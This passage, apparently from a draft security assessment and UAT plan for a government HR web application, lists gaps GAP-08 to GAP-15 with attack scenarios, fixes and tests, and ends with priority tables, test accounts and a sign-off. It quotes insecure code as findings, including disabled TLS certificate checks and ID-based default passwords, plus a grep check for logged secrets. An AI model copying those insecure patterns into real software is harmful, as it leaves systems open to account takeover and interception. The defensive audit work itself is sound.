git diff --cached | grep -E "logger\.(info|debug|warn).*secret|logger\.(info|debug|warn).*password|logger\.(info|debug|warn).*key" && \
  echo "ERROR: Potential secret logging detected. Remove before committing." && exit 1
```

#### Verification

| Test ID | Test | Expected Result |
|---------|------|----------------|
| GAP-08.V1 | Start application and check logs | No access key or secret key in startup logs |
| GAP-08.V2 | Search all log files for MinIO credentials | No matches for `minioadmin` or actual access key |
| GAP-08.V3 | Run credential leak scanner | No credential patterns found in log statements |

#### Rollback Plan

1. If MinIO connection debugging is needed, log only a boolean `minioConfigured: true/false` instead of the actual credentials.
2. Use debug-level logging (disabled in production) for detailed MinIO configuration.

---

### GAP-09: MFA Bypass for Users Without Email

**Severity:** Medium
**CVSS Score:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)
**OWASP Mapping:** A07:2021 - Identification and Authentication Failures

#### Current State

In `src/app/api/auth/login/route.ts:284`, the MFA gate is conditional on the user having an email address:

```typescript
if (user.email) {
  // MFA challenge required
  const mfaTokenExpiryMinutes = Number(process.env.MFA_TOKEN_EXPIRY_MINUTES) || 10;
  // ... send OTP/magic link
}
// If no email, skip MFA entirely and proceed to session creation
```

Users without an email address (which may include employee accounts created via JIT provisioning) bypass MFA entirely. This means:
- **Admin users without email** could have no second factor.
- **Employee accounts** created via JIT provisioning may not have email set.

#### Attack Scenario

1. An attacker obtains an employee's ZAN ID, ZSSF number, and payroll number (e.g., from a printed payslip or internal document).
2. The employee's account was JIT-provisioned without an email address.
3. The attacker logs in via the employee login endpoint with the three identifiers.
4. No MFA challenge is presented because the account has no email.
5. The attacker gains full access to the employee's account and data.

#### Remediation Steps

**Step 1: Identify users without MFA coverage**

```sql
SELECT username, role, email IS NULL AS missing_email
FROM "User"
WHERE active = true AND email IS NULL
ORDER BY role;
```

**Step 2: Enforce email collection for all users**

- Require email address during user creation (admin creates user).
- For JIT-provisioned employees, prompt for email on first login before granting access.
- Add email field to the employee login flow if not already present.

**Step 3: Implement alternative MFA for users without email**

For users who genuinely cannot have email (edge case):
- **TOTP (Time-based One-Time Password):** Use `speakeasy` or `otplib` to generate TOTP secrets. Users scan a QR code with Google Authenticator or similar app.
- **SMS-based OTP:** Send OTP to the user's phone number (from employee record).

**Step 4: Make MFA mandatory for admin roles**

Regardless of email status, enforce MFA for users with elevated privileges:

```typescript
const ADMIN_ROLES = ['Admin', 'HHRMD', 'HRMO', 'CSCS'];
if (ADMIN_ROLES.includes(user.role)) {
  // MFA is mandatory — if no email, require TOTP setup
  if (!user.email && !user.totpSecret) {
    return NextResponse.json({
      success: false,
      message: 'MFA setup required. Please contact administrator.',
      code: 'MFA_SETUP_REQUIRED',
    }, { status: 403 });
  }
}
```

#### Verification

| Test ID | Test | Expected Result |
|---------|------|----------------|
| GAP-09.V1 | Login as user without email | MFA challenge still presented (TOTP or setup prompt) |
| GAP-09.V2 | Login as admin without email | MFA mandatory, access denied until MFA configured |
| GAP-09.V3 | Query database for users without email or TOTP | Zero results for active users |
| GAP-09.V4 | JIT employee first login | Prompted to set email and/or TOTP before accessing dashboard |

#### Rollback Plan

1. Implement in phases: first enforce email collection, then add TOTP as fallback.
2. If TOTP implementation causes login issues, temporarily allow email-only MFA while fixing TOTP.

---

### GAP-10: JIT Default Password is Predictable (ZAN ID)

**Severity:** Medium
**CVSS Score:** 6.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N)
**OWASP Mapping:** A07:2021 - Identification and Authentication Failures

#### Current State

In `src/app/api/auth/employee-login/route.ts:121`:

```typescript
const defaultPassword = employee.zanId;
const hashedPassword = await hashPassword(defaultPassword);
```

The ZAN ID is used as the default password for JIT-provisioned employee accounts. ZAN IDs are:
- **Structured and predictable:** They follow a known format (e.g., national ID numbering scheme).
- **Potentially known to others:** ZAN IDs may appear on printed documents, internal records, or be known to colleagues.
- **Not secret:** They are identifiers, not authenticators.

#### Attack Scenario

1. An attacker knows a colleague's ZAN ID (seen on a document, email, or internal system).
2. The colleague has never logged into CSMS (account was JIT-provisioned but unused).
3. The attacker logs in via the employee login endpoint using the colleague's ZAN ID, ZSSF number, and payroll number.
4. The system creates a user account with the ZAN ID as the password.
5. The attacker now has access to the colleague's account.

#### Remediation Steps

**Step 1: Generate cryptographically random default passwords**

In `src/app/api/auth/employee-login/route.ts:121`, change from:

```typescript
const defaultPassword = employee.zanId;
```

To:

```typescript
import { randomBytes } from 'crypto';
const defaultPassword = randomBytes(16).toString('hex'); // 32-char random hex string
```

**Step 2: Deliver the default password securely**

Options for communicating the initial password to the employee:
- **Option A (Recommended):** Send via SMS to the employee's registered phone number.
- **Option B:** Display once to the HR officer who assisted with login, with instructions to communicate securely.
- **Option C:** Send via registered mail/email if available.

**Step 3: Enforce password change on first login**

Ensure the `mustChangePassword` flag is set on JIT-provisioned accounts:

```typescript
user = await db.user.create({
  data: {
    // ...
    isTemporaryPassword: true,
    mustChangePassword: true,
    temporaryPasswordExpiry: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000), // 7 days
  },
});
```

**Step 4: Expire unused default passwords**

Add a cron job that disables accounts where the temporary password was never changed after 7 days:

```sql
UPDATE "User"
SET active = false, "lockoutReason" = 'Temporary password expired'
WHERE "isTemporaryPassword" = true
  AND "temporaryPasswordExpiry" < NOW()
  AND active = true;
```

#### Verification

| Test ID | Test | Expected Result |
|---------|------|----------------|
| GAP-10.V1 | JIT provision a new employee | Default password is a 32-character random hex string, NOT the ZAN ID |
| GAP-10.V2 | Login with default password | Forced to change password before accessing dashboard |
| GAP-10.V3 | Wait 8 days, attempt login with default password | Account disabled, "Temporary password expired" |
| GAP-10.V4 | Check password hash in database | Hash is unique (different from any other user with same ZAN ID pattern) |

#### Rollback Plan

1. If random password delivery fails (SMS not configured), temporarily use a derived but non-obvious password (e.g., `ZAN_ID + last 4 of ZSSF + random suffix`).
2. Document the interim approach and set a deadline for SMS integration.

---

### GAP-11: Audit Logging Fire-and-Forget

**Severity:** Medium
**CVSS Score:** 5.0 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H)
**OWASP Mapping:** A09:2021 - Security Logging and Monitoring Failures

#### Current State

In `src/lib/audit-logger.ts:132-137`, audit log failures are silently swallowed:

```typescript
} catch (error: any) {
  // If audit logging fails, log to structured logger but don't throw
  // We don't want audit logging failures to break the app
  logger.error({ err: error }, 'Failed to log audit event');
  logger.error({ eventData: data }, 'Event data for failed audit log');
}
```

While this prevents audit failures from breaking the application (correct design), there is no mechanism to detect when audit logging is systematically failing. If the audit database becomes unavailable, all security events are silently lost with no alerting.

#### Attack Scenario

1. An attacker gains limited database access and drops the audit log table or fills the disk.
2. Audit logging begins failing silently.
3. The attacker performs malicious actions (data exfiltration, privilege escalation).
4. No audit records are created for the attacker's actions.
5. The security team has no visibility into the breach because audit failures were not monitored.

#### Remediation Steps

**Step 1: Add an audit health-check endpoint**

```typescript
// src/app/api/health/audit/route.ts
export async function GET() {
  try {
    // Attempt to write a health-check record
    await writeAuditLog({
      eventType: 'HEALTH_CHECK',
      eventCategory: 'SYSTEM',
      severity: 'INFO',
      attemptedRoute: '/api/health/audit',
      isAuthenticated: false,
      wasBlocked: false,
    });
    return NextResponse.json({ status: 'healthy' });
  } catch (error) {
    return NextResponse.json({ status: 'unhealthy', error: String(error) }, { status: 500 });
  }
}
```

**Step 2: Implement a failure counter with alerting**

```typescript
// src/lib/audit-health.ts
let consecutiveFailures = 0;
const MAX_CONSECUTIVE_FAILURES = 10;
const ALERT_THRESHOLD = 5;

export function recordAuditFailure(): void {
  consecutiveFailures++;
  if (consecutiveFailures === ALERT_THRESHOLD) {
    logger.error({ consecutiveFailures }, 'AUDIT_ALERT: Audit logging failures exceeding threshold');
    // Trigger alert (email, webhook, etc.)
  }
  if (consecutiveFailures >= MAX_CONSECUTIVE_FAILURES) {
    logger.error({ consecutiveFailures }, 'AUDIT_CRITICAL: Audit logging may be non-functional');
  }
}

export function recordAuditSuccess(): void {
  if (consecutiveFailures > 0) {
    logger.info({ consecutiveFailures }, 'Audit logging recovered');
  }
  consecutiveFailures = 0;
}

export function getAuditHealth(): { healthy: boolean; consecutiveFailures: number } {
  return {
    healthy: consecutiveFailures < ALERT_THRESHOLD,
    consecutiveFailures,
  };
}
```

**Step 3: Update audit logger to use health tracking**

In `src/lib/audit-logger.ts:132-137`:

```typescript
} catch (error: any) {
  recordAuditFailure();
  logger.error({ err: error }, 'Failed to log audit event');
}
```

And after successful writes:

```typescript
recordAuditSuccess();
```

**Step 4: Add monitoring integration**

Configure an external monitoring service (e.g., Prometheus, Grafana, or a simple cron job) to call `/api/health/audit` every 60 seconds and alert if unhealthy.

#### Verification

| Test ID | Test | Expected Result |
|---------|------|----------------|
| GAP-11.V1 | Stop audit database, trigger audit event | Failure logged to app logger, failure counter incremented |
| GAP-11.V2 | Trigger 5 consecutive audit failures | Alert generated (check logs for AUDIT_ALERT) |
| GAP-11.V3 | Call `/api/health/audit` | Returns `healthy: true/false` with failure count |
| GAP-11.V4 | Restore audit database | Failure counter resets, "Audit logging recovered" logged |

#### Rollback Plan

1. The health tracking is additive (doesn't change existing behavior).
2. If the health endpoint causes issues, it can be removed independently.
3. The fire-and-forget pattern is preserved; health tracking only adds observability.

---

### GAP-12: No CSP Reporting Endpoint

**Severity:** Low
**CVSS Score:** 3.1 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L)
**OWASP Mapping:** A05:2021 - Security Misconfiguration

#### Current State

The CSP in `next.config.ts:57-71` does not include a `report-uri` or `report-to` directive. CSP violations are logged in the browser console but not collected centrally, making it impossible to:
- Detect XSS attacks in real time.
- Identify CSP misconfigurations that break legitimate functionality.
- Monitor for new attack patterns.

#### Remediation Steps

**Step 1: Add a CSP violation report endpoint**

```typescript
// src/app/api/csp-report/route.ts
export async function POST(request: Request) {
  const report = await request.json();
  logger.warn({ cspReport: report }, 'CSP violation reported');
  // Store in audit log for analysis
  await logAuditEvent({
    eventType: 'CSP_VIOLATION',
    eventCategory: 'SECURITY',
    severity: 'WARNING',
    attemptedRoute: report['csp-report']?.['document-uri'] || 'unknown',
    additionalData: report,
  });
  return new Response(null, { status: 204 });
}
```

**Step 2: Add reporting directive to CSP**

In `next.config.ts`, add to the CSP string:

```
report-uri /api/csp-report;
```

Or use the newer `report-to` directive with a `Report-To` header.

**Step 3: Analyze collected reports**

Review CSP violation reports weekly to:
- Identify attempted XSS attacks (violations with `script-src`).
- Detect CSP misconfigurations (violations from legitimate app code).
- Tune the CSP policy based on real-world data.

#### Verification

| Test ID | Test | Expected Result |
|---------|------|----------------|
| GAP-12.V1 | Trigger a CSP violation (inject inline script in dev) | Violation report sent to `/api/csp-report` |
| GAP-12.V2 | Check audit log for CSP violations | CSP_VIOLATION events recorded |
| GAP-12.V3 | Review CSP header | `report-uri` or `report-to` directive present |

---

### GAP-13: No Subresource Integrity (SRI)

**Severity:** Low
**CVSS Score:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N)
**OWASP Mapping:** A08:2021 - Software and Data Integrity Failures

#### Current State

External scripts loaded from CDNs (Google Accounts, GStatic) lack `integrity` attributes. If a CDN is compromised, malicious code could be injected into these scripts without detection.

#### Remediation Steps

**Step 1: Generate SRI hashes for external scripts**

```bash
# For each external script URL, generate the integrity hash
curl -s https://accounts.google.com/gsi/client | openssl dgst -sha384 -binary | openssl base64 -A
```

**Step 2: Add integrity attributes**

```html
<script src="https://accounts.google.com/gsi/client"
        integrity="sha384-<generated-hash>"
        crossorigin="anonymous"></script>
```

**Step 3: Add to CI/CD pipeline**

Create a script that validates SRI hashes are up-to-date when dependencies change.

#### Verification

| Test ID | Test | Expected Result |
|---------|------|----------------|
| GAP-13.V1 | Check external script tags in page source | `integrity` attribute present with valid hash |
| GAP-13.V2 | Modify CDN script content, reload page | Script blocked by browser (SRI mismatch) |

---

### GAP-14: SMTP TLS Accepts Self-Signed Certificates

**Severity:** Low
**CVSS Score:** 4.8 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N)
**OWASP Mapping:** A02:2021 - Cryptographic Failures

#### Current State

In `src/lib/email.ts:32`:

```typescript
tls: {
  rejectUnauthorized: false,
},
```

This disables TLS certificate validation for the SMTP connection. A man-in-the-middle attacker could intercept email traffic (including MFA OTP codes and magic links) by presenting a self-signed certificate.

#### Remediation Steps

**Step 1: Remove the insecure TLS configuration**

```typescript
// Change from:
tls: {
  rejectUnauthorized: false,
},

// To:
tls: {
  rejectUnauthorized: process.env.NODE_ENV === 'production',
  // Only allow self-signed in development
},
```

**Step 2: Verify the production SMTP server has a valid certificate**

```bash
openssl s_client -connect smtp.example.com:587 -starttls smtp
```

**Step 3: If self-signed is required, pin the specific certificate**

Instead of disabling validation entirely, pin the known self-signed certificate:

```typescript
tls: {
  rejectUnauthorized: true,
  ca: process.env.SMTP_CA_CERT, // Path to the self-signed CA certificate
},
```

#### Verification

| Test ID | Test | Expected Result |
|---------|------|----------------|
| GAP-14.V1 | Check email.ts TLS config | `rejectUnauthorized: true` in production |
| GAP-14.V2 | Send test email in production | Email sent successfully (valid TLS) |
| GAP-14.V3 | Attempt MITM with self-signed cert | Connection rejected |

---

### GAP-15: No Request Body Size Limit

**Severity:** Low
**CVSS Score:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L)
**OWASP Mapping:** A05:2021 - Security Misconfiguration

#### Current State

Next.js API routes have no explicit `bodySizeLimit` configured. The default Next.js body parser limit is 4MB, but this can be exploited by sending multiple concurrent large requests to exhaust server memory.

#### Remediation Steps

**Step 1: Configure body size limit per route**

For file upload routes, set an explicit limit:

```typescript
// src/app/api/files/upload/route.ts
export const config = {
  api: {
    bodyParser: {
      sizeLimit: '1mb', // Match file validation limit
    },
  },
};
```

**Step 2: Add a global limit in next.config.ts**

```typescript
// Not directly supported in Next.js 14, but can be done via custom server
// or by adding body size checks in middleware
```

**Step 3: Add middleware-level body size check**

In `middleware.ts`, check `Content-Length` header and reject oversized requests:

```typescript
const MAX_BODY_SIZE = 2 * 1024 * 1024; // 2MB
const contentLength = parseInt(request.headers.get('content-length') || '0', 10);
if (contentLength > MAX_BODY_SIZE) {
  return new NextResponse('Request entity too large', { status: 413 });
}
```

#### Verification

| Test ID | Test | Expected Result |
|---------|------|----------------|
| GAP-15.V1 | Send POST request with 5MB body | 413 Request Entity Too Large |
| GAP-15.V2 | Send normal request (under limit) | Request processed normally |
| GAP-15.V3 | Check file upload route config | `bodySizeLimit: '1mb'` configured |

---

## 13.4 Remediation Priority Matrix

| Priority | Gap IDs | Combined Risk | Effort | Timeline |
|----------|---------|--------------|--------|----------|
| **P0 — Immediate** | GAP-01, GAP-02, GAP-03 | Critical: Auth bypass, secret exposure | Medium | Before production deployment |
| **P1 — High** | GAP-04, GAP-05, GAP-06, GAP-07 | High: XSS, PII exposure, RBAC drift | High | Within 2 weeks |
| **P2 — Medium** | GAP-08, GAP-09, GAP-10, GAP-11 | Medium: Credential leaks, MFA bypass | Medium | Within 1 month |
| **P3 — Low** | GAP-12, GAP-13, GAP-14, GAP-15 | Low: Defense-in-depth improvements | Low | Within 2 months |

## 13.5 Remediation Effort Summary

| Gap ID | Code Changes | Config Changes | DB Changes | Testing Required | Total Effort |
|--------|-------------|----------------|------------|-----------------|-------------|
| GAP-01 | High (auth flow refactor) | Low | None | High (full auth regression) | 3-5 days |
| GAP-02 | Low (1 line change) | Low (env var) | None | Low | 1 hour |
| GAP-03 | None | Medium (git, CI/CD) | None | Medium (rotation verification) | 2-4 hours |
| GAP-04 | High (nonce plumbing) | Medium (CSP config) | None | High (full app smoke test) | 3-5 days |
| GAP-05 | High (encryption layer) | Medium (pgcrypto) | High (new columns) | High (data integrity) | 5-10 days |
| GAP-06 | Medium (extract shared config) | None | None | Medium (RBAC regression) | 1-2 days |
| GAP-07 | Low (npm update) | Low (CI config) | None | Low | 1-2 hours |
| GAP-08 | Low (1 line change) | None | None | Low | 30 minutes |
| GAP-09 | High (TOTP integration) | Low | Low (new column) | High (MFA regression) | 3-5 days |
| GAP-10 | Low (1 line change) | None | None | Low | 30 minutes |
| GAP-11 | Medium (health endpoint) | Low | None | Low | 2-4 hours |
| GAP-12 | Low (new endpoint) | Low (CSP directive) | None | Low | 1-2 hours |
| GAP-13 | Low (add attributes) | None | None | Low | 1 hour |
| GAP-14 | Low (1 line change) | None | None | Low | 30 minutes |
| GAP-15 | Low (middleware check) | None | None | Low | 1 hour |

---

# 14. UAT Test Execution

## 14.1 Test Environment

| Component | Specification |
|-----------|--------------|
| Application URL | http://10.0.225.15:9002 |
| Platform | Next.js 14 with TypeScript |
| Database | PostgreSQL "nody" database |
| Object Storage | MinIO |
| Cache | Redis |
| Logging | Pino to `/var/log/csms/app/app.log` |

## 14.2 Required Test Accounts

| Role | Username | Institution |
|------|----------|-------------|
| Admin | akassim | TUME YA UTUMISHI SERIKALINI |
| HHRMD | skhamis | TUME YA UTUMISHI SERIKALINI |
| HRMO | fiddi | TUME YA UTUMISHI SERIKALINI |
| DO | mussi | TUME YA UTUMISHI SERIKALINI |
| CSCS | zhaji | TUME YA UTUMISHI SERIKALINI |
| HRRP | khamadi | TUME YA UTUMISHI SERIKALINI |
| PO | mishak | TUME YA UTUMISHI SERIKALINI |
| HRO | kmnyonge | OFISI YA RAIS, FEDHA NA MIPANGO |
| EMPLOYEE | alijuma | OFISI YA RAIS, FEDHA NA MIPANGO |

## 14.3 Entry Criteria

- [ ] Application deployed and accessible in test environment
- [ ] Test user accounts created with all roles
- [ ] Redis service operational
- [ ] MinIO service operational
- [ ] ClamAV service configured (or disabled for testing)
- [ ] Database populated with test data
- [ ] Source code available for white-box verification

## 14.4 Exit Criteria

- [ ] All control tests executed
- [ ] All Critical gaps acknowledged with remediation plan
- [ ] All High gaps documented with remediation timeline
- [ ] Minimum 90% of functional control tests passed
- [ ] Known gaps reviewed and accepted by project stakeholders
- [ ] UAT sign-off obtained

---

# 15. Control Summary

| Control ID | Control Name | Test Cases | Priority |
|-----------|--------------|-----------|----------|
| AUTH-01 | User Authentication | 5 | Critical |
| AUTH-02 | Employee Self-Service Login | 4 | Critical |
| AUTH-03 | Account Lockout | 4 | High |
| AUTH-04 | Password Policies | 5 | High |
| SESS-01 | Session Management | 5 | Critical |
| SESS-02 | Inactivity Timeout | 4 | Medium |
| SESS-03 | Auth Cookie Security | 4 | Critical |
| AUTHZ-01 | RBAC Enforcement | 5 | Critical |
| AUTHZ-02 | Data-Level Access Control | 3 | High |
| INPVAL-01 | Schema Validation | 4 | High |
| INPVAL-02 | SQL Injection Prevention | 4 | Critical |
| CSRF-01 | CSRF Token Validation | 6 | Critical |
| CSRF-02 | CSRF Secret Configuration | 2 | Critical |
| RATE-01 | Tiered Rate Limiting | 4 | High |
| RATE-02 | MFA Rate Limiting | 2 | Medium |
| FILE-01 | Multi-Stage File Validation | 7 | Critical |
| CRYPTO-01 | Password Hashing | 4 | Critical |
| CRYPTO-02 | Response Sanitization | 2 | High |
| HEADERS-01 | Security Headers | 4 | High |
| AUDIT-01 | Audit Logging | 8 | High |
| DETECT-01 | Suspicious Activity Detection | 2 | Medium |
| **Total** | **21 Controls** | **83 Test Cases** | |

---

# 16. Sign-Off

| Role | Name | Signature | Date |
|------|------|-----------|------|
| Security Test Lead | | | |
| Security Analyst | | | |
| Application Developer | | | |
| Project Manager | | | |
| Business Owner | | | |

---

**Document Status:** DRAFT
**Classification:** CONFIDENTIAL
**Version:** 2.0
**Date:** May 29, 2026
